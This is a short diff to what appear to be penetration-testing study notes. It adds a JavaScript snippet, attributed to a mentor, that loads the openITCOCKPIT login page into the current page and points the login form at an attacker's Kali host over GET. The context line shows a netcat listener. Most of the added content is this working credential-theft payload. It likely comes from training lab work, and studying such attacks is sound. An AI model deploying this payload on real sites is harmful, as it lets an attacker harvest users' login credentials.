@@ -1480,3 +1480,12 @@ nc -nvlp 8888
 
 
 
+Some example of login page from mentor:
+
+```
+fetch("https://openitcockpit/login/login.html").then(res => res.text().then(data => {
+	document.getElementsByTagName("html")[0].innerHTML = data
+	document.getElementsByTagName("form")[0].action = "http://kali_IP"
+	document.getElementsByTagName("form")[0].method = "get"
+}))
+```
